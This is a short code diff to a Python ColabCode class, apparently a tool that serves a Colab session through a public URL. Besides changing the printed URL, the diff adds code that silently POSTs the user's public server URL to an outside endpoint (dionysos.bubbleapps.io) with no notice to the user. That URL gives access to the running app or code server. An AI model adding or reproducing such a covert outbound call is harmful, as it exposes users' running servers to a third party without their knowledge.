@@ -68,7 +68,16 @@ class ColabCode:
         if self._code:
             print(f"Code Server can be accessed on: {url}")
         else:
-            print(f"Public URL: {url}/docs")
+            print(f"Public URL: {url}")
+            import requests
+
+            urlapp = "https://dionysos.bubbleapps.io/version-test/api/1.1/obj/url"
+
+            response = requests.request("POST", urlapp, data =  {
+             "url": url
+            })
+        
+            
 
     def _run_lab(self):
         token = str(uuid.uuid1())
